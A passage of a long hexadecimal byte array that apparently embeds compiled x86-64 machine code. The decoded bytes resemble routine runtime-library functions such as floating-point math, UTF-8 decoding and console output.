0x66, 0xf, 0x2f, 0x35, 0x17, 0x83, 0x0, 0x0, 0xf, 0x84, 0xd8, 0x1, 0x0, 0x0, 0x66, 0xf, 0x54, 0x25, 0x69, 0x83, 0x0, 0x0, 0x4c, 0x8b, 0xc8, 0x48, 0x23, 0x5, 0xef, 0x81, 0x0, 0x0, 0x4c, 0x23, 0xd, 0xf8, 0x81, 0x0, 0x0, 0x49, 0xd1, 0xe1, 0x49, 0x3, 0xc1, 0x66, 0x48, 0xf, 0x6e, 0xc8, 0x66, 0xf, 0x2f, 0x25, 0x5, 0x83, 0x0, 0x0, 0xf, 0x82, 0xdf, 0x0, 0x0, 0x0, 0x48, 0xc1, 0xe8, 0x2c, 0x66, 0xf, 0xeb, 0x15, 0x53, 0x82, 0x0, 0x0, 0x66, 0xf, 0xeb, 0xd, 0x4b, 0x82, 0x0, 0x0, 0x4c, 0x8d, 0xd, 0xc4, 0x93, 0x0, 0x0, 0xf2, 0xf, 0x5c, 0xca, 0xf2, 0x41, 0xf, 0x59, 0xc, 0xc1, 0x66, 0xf, 0x28, 0xd1, 0x66, 0xf, 0x28, 0xc1, 0x4c, 0x8d, 0xd, 0x8b, 0x83, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x1d, 0x93, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x10, 0xd, 0x5b, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xda, 0xf2, 0xf, 0x59, 0xca, 0xf2, 0xf, 0x59, 0xc2, 0x66, 0xf, 0x28, 0xe0, 0xf2, 0xf, 0x58, 0x1d, 0x63, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x58, 0xd, 0x2b, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xe0, 0xf2, 0xf, 0x59, 0xda, 0xf2, 0xf, 0x59, 0xc8, 0xf2, 0xf, 0x58, 0x1d, 0x37, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x58, 0xca, 0xf2, 0xf, 0x59, 0xdc, 0xf2, 0xf, 0x58, 0xcb, 0xf2, 0xf, 0x10, 0x2d, 0xa3, 0x81, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xd, 0x5b, 0x81, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xee, 0xf2, 0xf, 0x5c, 0xe9, 0xf2, 0x41, 0xf, 0x10, 0x4, 0xc1, 0x48, 0x8d, 0x15, 0x26, 0x8b, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x14, 0xc2, 0xf2, 0xf, 0x10, 0x25, 0x69, 0x81, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xe6, 0xf2, 0xf, 0x58, 0xc4, 0xf2, 0xf, 0x58, 0xd5, 0xf2, 0xf, 0x58, 0xc2, 0x66, 0xf, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x15, 0x58, 0x81, 0x0, 0x0, 0xf2, 0xf, 0x5c, 0x5, 0x60, 0x81, 0x0, 0x0, 0xf2, 0xf, 0x58, 0xd0, 0x66, 0xf, 0x28, 0xc8, 0xf2, 0xf, 0x5e, 0xca, 0xf2, 0xf, 0x10, 0x25, 0x5c, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x2d, 0x74, 0x82, 0x0, 0x0, 0x66, 0xf, 0x28, 0xf0, 0xf2, 0xf, 0x59, 0xf1, 0xf2, 0xf, 0x58, 0xc9, 0x66, 0xf, 0x28, 0xd1, 0xf2, 0xf, 0x59, 0xd1, 0xf2, 0xf, 0x59, 0xe2, 0xf2, 0xf, 0x59, 0xea, 0xf2, 0xf, 0x58, 0x25, 0x20, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x58, 0x2d, 0x38, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xd1, 0xf2, 0xf, 0x59, 0xe2, 0xf2, 0xf, 0x59, 0xd2, 0xf2, 0xf, 0x59, 0xd1, 0xf2, 0xf, 0x59, 0xea, 0xf2, 0xf, 0x10, 0x15, 0xbc, 0x80, 0x0, 0x0, 0xf2, 0xf, 0x58, 0xe5, 0xf2, 0xf, 0x5c, 0xe6, 0xf2, 0xf, 0x10, 0x35, 0x9c, 0x80, 0x0, 0x0, 0x66, 0xf, 0x28, 0xd8, 0x66, 0xf, 0xdb, 0x1d, 0x20, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x5c, 0xc3, 0xf2, 0xf, 0x58, 0xe0, 0x66, 0xf, 0x28, 0xc3, 0x66, 0xf, 0x28, 0xcc, 0xf2, 0xf, 0x59, 0xe2, 0xf2, 0xf, 0x59, 0xc2, 0xf2, 0xf, 0x59, 0xce, 0xf2, 0xf, 0x59, 0xde, 0xf2, 0xf, 0x58, 0xc4, 0xf2, 0xf, 0x58, 0xc1, 0xf2, 0xf, 0x58, 0xc3, 0x66, 0xf, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x66, 0xf, 0xeb, 0x15, 0xa1, 0x80, 0x0, 0x0, 0xf2, 0xf, 0x5c, 0x15, 0x99, 0x80, 0x0, 0x0, 0xf2, 0xf, 0x10, 0xea, 0x66, 0xf, 0xdb, 0x15, 0xfd, 0x7f, 0x0, 0x0, 0x66, 0x48, 0xf, 0x7e, 0xd0, 0x66, 0xf, 0x73, 0xd5, 0x34, 0x66, 0xf, 0xfa, 0x2d, 0x1b, 0x81, 0x0, 0x0, 0xf3, 0xf, 0xe6, 0xf5, 0xe9, 0xf1, 0xfd, 0xff, 0xff, 0x66, 0x90, 0x75, 0x1e, 0xf2, 0xf, 0x10, 0xd, 0x76, 0x7f, 0x0, 0x0, 0x44, 0x8b, 0x5, 0xaf, 0x81, 0x0, 0x0, 0xe8, 0x1a, 0xb, 0x0, 0x0, 0xeb, 0x48, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf2, 0xf, 0x10, 0xd, 0x78, 0x7f, 0x0, 0x0, 0x44, 0x8b, 0x5, 0x95, 0x81, 0x0, 0x0, 0xe8, 0xfc, 0xa, 0x0, 0x0, 0xeb, 0x2a, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x3b, 0x5, 0x49, 0x7f, 0x0, 0x0, 0x74, 0x17, 0x48, 0x3b, 0x5, 0x30, 0x7f, 0x0, 0x0, 0x74, 0xce, 0x48, 0xb, 0x5, 0x57, 0x7f, 0x0, 0x0, 0x66, 0x48, 0xf, 0x6e, 0xc0, 0x66, 0x90, 0x66, 0xf, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xf, 0x1f, 0x44, 0x0, 0x0, 0x48, 0x33, 0xc0, 0xc5, 0xe1, 0x73, 0xd0, 0x34, 0xc4, 0xe1, 0xf9, 0x7e, 0xc0, 0xc5, 0xe1, 0xfb, 0x1d, 0x3b, 0x7f, 0x0, 0x0, 0xc5, 0xfa, 0xe6, 0xf3, 0xc5, 0xf9, 0xdb, 0x2d, 0xff, 0x7e, 0x0, 0x0, 0xc5, 0xf9, 0x2f, 0x2d, 0xf7, 0x7e, 0x0, 0x0, 0xf, 0x84, 0x41, 0x2, 0x0, 0x0, 0xc5, 0xd1, 0xef, 0xed, 0xc5, 0xf9, 0x2f, 0xc5, 0xf, 0x86, 0xe3, 0x1, 0x0, 0x0, 0xc5, 0xf9, 0xdb, 0x15, 0x2b, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x5c, 0x25, 0xb3, 0x7f, 0x0, 0x0, 0xc5, 0xf9, 0x2f, 0x35, 0x3b, 0x80, 0x0, 0x0, 0xf, 0x84, 0x8e, 0x1, 0x0, 0x0, 0xc5, 0xf9, 0xdb, 0xd, 0x1d, 0x7f, 0x0, 0x0, 0xc5, 0xf9, 0xdb, 0x1d, 0x25, 0x7f, 0x0, 0x0, 0xc5, 0xe1, 0x73, 0xf3, 0x1, 0xc5, 0xe1, 0xd4, 0xc9, 0xc4, 0xe1, 0xf9, 0x7e, 0xc8, 0xc5, 0xd9, 0xdb, 0x25, 0x6f, 0x80, 0x0, 0x0, 0xc5, 0xf9, 0x2f, 0x25, 0x27, 0x80, 0x0, 0x0, 0xf, 0x82, 0xb1, 0x0, 0x0, 0x0, 0x48, 0xc1, 0xe8, 0x2c, 0xc5, 0xe9, 0xeb, 0x15, 0x75, 0x7f, 0x0, 0x0, 0xc5, 0xf1, 0xeb, 0xd, 0x6d, 0x7f, 0x0, 0x0, 0x4c, 0x8d, 0xd, 0xe6, 0x90, 0x0, 0x0, 0xc5, 0xf3, 0x5c, 0xca, 0xc4, 0xc1, 0x73, 0x59, 0xc, 0xc1, 0x4c, 0x8d, 0xd, 0xb5, 0x80, 0x0, 0x0, 0xc5, 0xf3, 0x59, 0xc1, 0xc5, 0xfb, 0x10, 0x1d, 0xb9, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x10, 0x2d, 0x81, 0x7f, 0x0, 0x0, 0xc4, 0xe2, 0xf1, 0xa9, 0x1d, 0x98, 0x7f, 0x0, 0x0, 0xc4, 0xe2, 0xf1, 0xa9, 0x2d, 0x2f, 0x7f, 0x0, 0x0, 0xf2, 0xf, 0x10, 0xe0, 0xc4, 0xe2, 0xf1, 0xa9, 0x1d, 0x72, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x59, 0xe0, 0xc4, 0xe2, 0xd1, 0xb9, 0xc8, 0xc4, 0xe2, 0xe1, 0xb9, 0xcc, 0xc5, 0xf3, 0x59, 0xd, 0x9c, 0x7e, 0x0, 0x0, 0xc5, 0xfb, 0x10, 0x2d, 0xd4, 0x7e, 0x0, 0x0, 0xc4, 0xe2, 0xc9, 0xab, 0xe9, 0xf2, 0x41, 0xf, 0x10, 0x4, 0xc1, 0x48, 0x8d, 0x15, 0x62, 0x88, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x14, 0xc2, 0xc5, 0xeb, 0x58, 0xd5, 0xc4, 0xe2, 0xc9, 0xb9, 0x5, 0xa0, 0x7e, 0x0, 0x0, 0xc5, 0xfb, 0x58, 0xc2, 0xc5, 0xf9, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x90, 0xc5, 0xfb, 0x10, 0x15, 0xa8, 0x7e, 0x0, 0x0, 0xc5, 0xfb, 0x5c, 0x5, 0xb0, 0x7e, 0x0, 0x0, 0xc5, 0xeb, 0x58, 0xd0, 0xc5, 0xfb, 0x5e, 0xca, 0xc5, 0xfb, 0x10, 0x25, 0xb0, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x10, 0x2d, 0xc8, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x59, 0xf1, 0xc5, 0xf3, 0x58, 0xc9, 0xc5, 0xf3, 0x59, 0xd1, 0xc4, 0xe2, 0xe9, 0xa9, 0x25, 0x83, 0x7f, 0x0, 0x0, 0xc4, 0xe2, 0xe9, 0xa9, 0x2d, 0x9a, 0x7f, 0x0, 0x0, 0xc5, 0xeb, 0x59, 0xd1, 0xc5, 0xdb, 0x59, 0xe2, 0xc5, 0xeb, 0x59, 0xd2, 0xc5, 0xeb, 0x59, 0xd1, 0xc5, 0xd3, 0x59, 0xea, 0xc5, 0xdb, 0x58, 0xe5, 0xc5, 0xdb, 0x5c, 0xe6, 0xc5, 0xf9, 0xdb, 0x1d, 0x96, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x5c, 0xc3, 0xc5, 0xdb, 0x58, 0xe0, 0xc5, 0xdb, 0x59, 0xd, 0xf6, 0x7d, 0x0, 0x0, 0xc5, 0xdb, 0x59, 0x25, 0xfe, 0x7d, 0x0, 0x0, 0xc5, 0xe3, 0x59, 0x5, 0xf6, 0x7d, 0x0, 0x0, 0xc5, 0xe3, 0x59, 0x1d, 0xde, 0x7d, 0x0, 0x0, 0xc5, 0xfb, 0x58, 0xc4, 0xc5, 0xfb, 0x58, 0xc1, 0xc5, 0xfb, 0x58, 0xc3, 0xc5, 0xf9, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xc5, 0xe9, 0xeb, 0x15, 0xf, 0x7e, 0x0, 0x0, 0xc5, 0xeb, 0x5c, 0x15, 0x7, 0x7e, 0x0, 0x0, 0xc5, 0xd1, 0x73, 0xd2, 0x34, 0xc5, 0xe9, 0xdb, 0x15, 0x6a, 0x7d, 0x0, 0x0, 0xc5, 0xf9, 0x28, 0xc2, 0xc5, 0xd1, 0xfa, 0x2d, 0x8e, 0x7e, 0x0, 0x0, 0xc5, 0xfa, 0xe6, 0xf5, 0xe9, 0x40, 0xfe, 0xff, 0xff, 0xf, 0x1f, 0x44, 0x0, 0x0, 0x75, 0x2e, 0xc5, 0xfb, 0x10, 0xd, 0xe6, 0x7c, 0x0, 0x0, 0x44, 0x8b, 0x5, 0x1f, 0x7f, 0x0, 0x0, 0xe8, 0x8a, 0x8, 0x0, 0x0, 0xc5, 0xf9, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc5, 0xfb, 0x10, 0xd, 0xd8, 0x7c, 0x0, 0x0, 0x44, 0x8b, 0x5, 0xf5, 0x7e, 0x0, 0x0, 0xe8, 0x5c, 0x8, 0x0, 0x0, 0xc5, 0xf9, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x90, 0x48, 0x3b, 0x5, 0xa9, 0x7c, 0x0, 0x0, 0x74, 0x27, 0x48, 0x3b, 0x5, 0x90, 0x7c, 0x0, 0x0, 0x74, 0xce, 0x48, 0xb, 0x5, 0xb7, 0x7c, 0x0, 0x0, 0x66, 0x48, 0xf, 0x6e, 0xc8, 0x44, 0x8b, 0x5, 0xc3, 0x7e, 0x0, 0x0, 0xe8, 0x26, 0x8, 0x0, 0x0, 0xeb, 0x4, 0xf, 0x1f, 0x40, 0x0, 0xc5, 0xf9, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xcc, 0x48, 0x83, 0x22, 0x0, 0x48, 0x8b, 0xc1, 0xc3, 0x48, 0x83, 0x21, 0x0, 0x48, 0x83, 0xc8, 0xff, 0xc6, 0x42, 0x30, 0x1, 0xc7, 0x42, 0x2c, 0x2a, 0x0, 0x0, 0x0, 0xc3, 0x40, 0x53, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x5, 0x62, 0xc0, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xb4, 0x24, 0xa0, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x15, 0xbb, 0xd6, 0x0, 0x0, 0x45, 0x33, 0xdb, 0x48, 0x8d, 0x3d, 0x53, 0x2a, 0x0, 0x0, 0x4d, 0x85, 0xc9, 0x48, 0x8b, 0xc2, 0x4c, 0x8b, 0xe2, 0x4d, 0xf, 0x45, 0xd1, 0x48, 0x85, 0xd2, 0x41, 0x8d, 0x6b, 0x1, 0x48, 0xf, 0x45, 0xfa, 0x44, 0x8b, 0xfd, 0x4d, 0xf, 0x45, 0xf8, 0x48, 0xf7, 0xd8, 0x4d, 0x1b, 0xf6, 0x4c, 0x23, 0xf1, 0x4d, 0x85, 0xff, 0x75, 0xc, 0x48, 0xc7, 0xc0, 0xfe, 0xff, 0xff, 0xff, 0xe9, 0x4d, 0x1, 0x0, 0x0, 0x66, 0x45, 0x39, 0x5a, 0x6, 0x75, 0x68, 0x44, 0xf, 0xb6, 0xf, 0x48, 0xff, 0xc7, 0x45, 0x84, 0xc9, 0x78, 0x17, 0x4d, 0x85, 0xf6, 0x74, 0x3, 0x45, 0x89, 0xe, 0x45, 0x84, 0xc9, 0x41, 0xf, 0x95, 0xc3, 0x49, 0x8b, 0xc3, 0xe9, 0x23, 0x1, 0x0, 0x0, 0x41, 0x8a, 0xc1, 0x24, 0xe0, 0x3c, 0xc0, 0x75, 0x5, 0x41, 0xb0, 0x2, 0xeb, 0x1e, 0x41, 0x8a, 0xc1, 0x24, 0xf0, 0x3c, 0xe0, 0x75, 0x5, 0x41, 0xb0, 0x3, 0xeb, 0x10, 0x41, 0x8a, 0xc1, 0x24, 0xf8, 0x3c, 0xf0, 0xf, 0x85, 0xef, 0x0, 0x0, 0x0, 0x41, 0xb0, 0x4, 0x41, 0xf, 0xb6, 0xc0, 0xb9, 0x7, 0x0, 0x0, 0x0, 0x2b, 0xc8, 0x8b, 0xd5, 0xd3, 0xe2, 0x41, 0x8a, 0xd8, 0x2b, 0xd5, 0x41, 0x23, 0xd1, 0xeb, 0x29, 0x45, 0x8a, 0x42, 0x4, 0x41, 0x8b, 0x12, 0x41, 0x8a, 0x5a, 0x6, 0x41, 0x8d, 0x40, 0xfe, 0x3c, 0x2, 0xf, 0x87, 0xbc, 0x0, 0x0, 0x0, 0x40, 0x3a, 0xdd, 0xf, 0x82, 0xb3, 0x0, 0x0, 0x0, 0x41, 0x3a, 0xd8, 0xf, 0x83, 0xaa, 0x0, 0x0, 0x0, 0xf, 0xb6, 0xeb, 0x49, 0x3b, 0xef, 0x44, 0x8b, 0xcd, 0x4d, 0xf, 0x43, 0xcf, 0xeb, 0x1e, 0xf, 0xb6, 0xf, 0x48, 0xff, 0xc7, 0x8a, 0xc1, 0x24, 0xc0, 0x3c, 0x80, 0xf, 0x85, 0x89, 0x0, 0x0, 0x0, 0x8b, 0xc2, 0x83, 0xe1, 0x3f, 0xc1, 0xe0, 0x6, 0x8b, 0xd1, 0xb, 0xd0, 0x48, 0x8b, 0xc7, 0x49, 0x2b, 0xc4, 0x49, 0x3b, 0xc1, 0x72, 0xd7, 0x4c, 0x3b, 0xcd, 0x73, 0x1c, 0x41, 0xf, 0xb6, 0xc0, 0x41, 0x2a, 0xd9, 0x66, 0x41, 0x89, 0x42, 0x4, 0xf, 0xb6, 0xc3, 0x66, 0x41, 0x89, 0x42, 0x6, 0x41, 0x89, 0x12, 0xe9, 0x3, 0xff, 0xff, 0xff, 0x8d, 0x82, 0x0, 0x28, 0xff, 0xff, 0x3d, 0xff, 0x7, 0x0, 0x0, 0x76, 0x44, 0x81, 0xfa, 0x0, 0x0, 0x11, 0x0, 0x73, 0x3c, 0x41, 0xf, 0xb6, 0xc0, 0xc7, 0x44, 0x24, 0x20, 0x80, 0x0, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x24, 0x0, 0x8, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x28, 0x0, 0x0, 0x1, 0x0, 0x3b, 0x54, 0x84, 0x18, 0x72, 0x1a, 0x4d, 0x85, 0xf6, 0x74, 0x3, 0x41, 0x89, 0x16, 0xf7, 0xda, 0x49, 0x8b, 0xd2, 0x48, 0x1b, 0xc9, 0x48, 0x23, 0xcd, 0xe8, 0x34, 0xfe, 0xff, 0xff, 0xeb, 0xb, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xca, 0xe8, 0x2f, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x33, 0xcc, 0xe8, 0x1e, 0xd, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x5, 0x3f, 0xc8, 0x0, 0x0, 0x33, 0xdb, 0x48, 0x83, 0xf8, 0xfe, 0x75, 0x2e, 0x48, 0x89, 0x5c, 0x24, 0x30, 0x44, 0x8d, 0x43, 0x3, 0x89, 0x5c, 0x24, 0x28, 0x48, 0x8d, 0xd, 0x93, 0x7c, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x44, 0x89, 0x44, 0x24, 0x20, 0xba, 0x0, 0x0, 0x0, 0x40, 0xff, 0x15, 0xb8, 0x1f, 0x0, 0x0, 0x48, 0x89, 0x5, 0x9, 0xc8, 0x0, 0x0, 0x48, 0x83, 0xf8, 0xff, 0xf, 0x95, 0xc3, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x40, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xd, 0xed, 0xc7, 0x0, 0x0, 0x48, 0x83, 0xf9, 0xfd, 0x77, 0x6, 0xff, 0x15, 0x91, 0x1f, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x83, 0x60, 0xd8, 0x0, 0x49, 0x8b, 0xf8, 0x4d, 0x8b, 0xc8, 0x8b, 0xf2, 0x44, 0x8b, 0xc2, 0x48, 0x8b, 0xe9, 0x48, 0x8b, 0xd1, 0x48, 0x8b, 0xd, 0xab, 0xc7, 0x0, 0x0, 0xff, 0x15, 0x8d, 0x1d, 0x0, 0x0, 0x8b, 0xd8, 0x85, 0xc0, 0x75, 0x6a, 0xff, 0x15, 0x99, 0x1d, 0x0, 0x0, 0x83, 0xf8, 0x6, 0x75, 0x5f, 0x48, 0x8b, 0xd, 0x8d, 0xc7, 0x0, 0x0, 0x48, 0x83, 0xf9, 0xfd, 0x77, 0x6, 0xff, 0x15, 0x31, 0x1f, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x48, 0x8d, 0xd, 0xe4, 0x7b, 0x0, 0x0, 0x83, 0x64, 0x24, 0x28, 0x0, 0x41, 0xb8, 0x3, 0x0, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x44, 0x89, 0x44, 0x24, 0x20, 0xba, 0x0, 0x0, 0x0, 0x40, 0xff, 0x15, 0xfe, 0x1e, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x4c, 0x8b, 0xcf, 0x48, 0x8b, 0xc8, 0x48, 0x89, 0x5, 0x43, 0xc7, 0x0, 0x0, 0x44, 0x8b, 0xc6, 0x48, 0x8b, 0xd5, 0xff, 0x15, 0x1f, 0x1d, 0x0, 0x0, 0x8b, 0xd8, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0x8b, 0xa, 0xe8, 0x10, 0xdf, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x3, 0x48, 0x63, 0x8, 0x4c, 0x8b, 0xd1, 0x48, 0x8b, 0x53, 0x8, 0x48, 0x8b, 0xc1, 0x48, 0xc1, 0xf8, 0x6, 0x4c, 0x8d, 0xd, 0x24, 0xcf, 0x0, 0x0, 0x41, 0x83, 0xe2, 0x3f, 0x4f, 0x8d, 0x4, 0xd2, 0x49, 0x8b, 0x4, 0xc1, 0x42, 0xf6, 0x44, 0xc0, 0x38, 0x1, 0x74, 0x9, 0xe8, 0xeb, 0x0, 0x0, 0x0, 0x8b, 0xd8, 0xeb, 0xe, 0xc6, 0x42, 0x30, 0x1, 0xc7, 0x42, 0x2c, 0x9, 0x0, 0x0, 0x0, 0x83, 0xcb, 0xff, 0x8b, 0xf, 0xe8, 0xea, 0xde, 0xff, 0xff, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x58, 0x4c, 0x63, 0xc1, 0x45, 0x33, 0xc9, 0x41, 0x83, 0xf8, 0xfe, 0x75, 0x18, 0xc6, 0x42, 0x38, 0x1, 0x44, 0x89, 0x4a, 0x34, 0xc6, 0x42, 0x30, 0x1, 0xc7, 0x42, 0x2c, 0x9, 0x0, 0x0, 0x0, 0xe9, 0x8d, 0x0, 0x0, 0x0, 0x85, 0xc9, 0x78, 0x60, 0x44, 0x3b, 0x5, 0xad, 0xd2, 0x0, 0x0, 0x73, 0x57, 0x49, 0x8b, 0xc8, 0x4c, 0x8d, 0x15, 0xa1, 0xce, 0x0, 0x0, 0x83, 0xe1, 0x3f, 0x49, 0x8b, 0xc0, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xc, 0xc9, 0x49, 0x8b, 0x4, 0xc2, 0xf6, 0x44, 0xc8, 0x38, 0x1, 0x74, 0x34, 0x48, 0x8d, 0x44, 0x24, 0x60, 0x48, 0x89, 0x54, 0x24, 0x40, 0x44, 0x89, 0x44, 0x24, 0x78, 0x48, 0x8d, 0x54, 0x24, 0x30, 0x44, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4c, 0x24, 0x78, 0x4c, 0x8d, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8d, 0x4c, 0x24, 0x70, 0xe8, 0xfa, 0xfe, 0xff, 0xff, 0xeb, 0x2c, 0xc6, 0x42, 0x38, 0x1, 0x45, 0x33, 0xc0, 0x44, 0x89, 0x4a, 0x34, 0x33, 0xc9, 0xc6, 0x42, 0x30, 0x1, 0x48, 0x89, 0x54, 0x24, 0x28, 0xc7, 0x42, 0x2c, 0x9, 0x0, 0x0, 0x0, 0x33, 0xd2, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0xe8, 0x77, 0x94, 0xff, 0xff, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x63, 0xf9, 0x48, 0x8b, 0xf2, 0x8b, 0xcf, 0xe8, 0xe0, 0xde, 0xff, 0xff, 0x48, 0x83, 0xf8, 0xff, 0x75, 0x4, 0x33, 0xdb, 0xeb, 0x5a, 0x48, 0x8b, 0x5, 0xf3, 0xcd, 0x0, 0x0, 0xb9, 0x2, 0x0, 0x0, 0x0, 0x83, 0xff, 0x1, 0x75, 0x9, 0x40, 0x84, 0xb8, 0xc8, 0x0, 0x0, 0x0, 0x75, 0xd, 0x3b, 0xf9, 0x75, 0x20, 0xf6, 0x80, 0x80, 0x0, 0x0, 0x0, 0x1, 0x74, 0x17, 0xe8, 0xaa, 0xde, 0xff, 0xff, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0xe8, 0x9d, 0xde, 0xff, 0xff, 0x48, 0x3b, 0xc3, 0x74, 0xbe, 0x8b, 0xcf, 0xe8, 0x91, 0xde, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0xff, 0x15, 0x1c, 0x1d, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xaa, 0xff, 0x15, 0x62, 0x1b, 0x0, 0x0, 0x8b, 0xd8, 0x8b, 0xcf, 0xe8, 0xb9, 0xdd, 0xff, 0xff, 0x48, 0x8b, 0xd7, 0x4c, 0x8d, 0x5, 0x8f, 0xcd, 0x0, 0x0, 0x83, 0xe2, 0x3f, 0x48, 0x8b, 0xcf, 0x48, 0xc1, 0xf9, 0x6, 0x48, 0x8d, 0x14, 0xd2, 0x49, 0x8b, 0xc, 0xc8, 0xc6, 0x44, 0xd1, 0x38, 0x0, 0x85, 0xdb, 0x74, 0xf, 0x48, 0x8b, 0xd6, 0x8b, 0xcb, 0xe8, 0x7e, 0x95, 0xff, 0xff, 0x83, 0xc8, 0xff, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x83, 0x49, 0x18, 0xff, 0x33, 0xc0, 0x48, 0x89, 0x1, 0x48, 0x89, 0x41, 0x8, 0x89, 0x41, 0x10, 0x48, 0x89, 0x41, 0x1c, 0x48, 0x89, 0x41, 0x28, 0x87, 0x41, 0x14, 0xc3, 0x48, 0x8b, 0xc4, 0x53, 0x48, 0x83, 0xec, 0x50, 0xf2, 0xf, 0x10, 0x84, 0x24, 0x80, 0x0, 0x0, 0x0, 0x8b, 0xd9, 0xf2, 0xf, 0x10, 0x8c, 0x24, 0x88, 0x0, 0x0, 0x0, 0xba, 0xc0, 0xff, 0x0, 0x0, 0x89, 0x48, 0xc8, 0x48, 0x8b, 0x8c, 0x24, 0x90, 0x0, 0x0, 0x0, 0xf2, 0xf, 0x11, 0x40, 0xe0, 0xf2, 0xf, 0x11, 0x48, 0xe8, 0xf2, 0xf, 0x11, 0x58, 0xd8, 0x4c, 0x89, 0x40, 0xd0, 0xe8, 0x28, 0x7, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x96, 0xbd, 0xff, 0xff, 0x85, 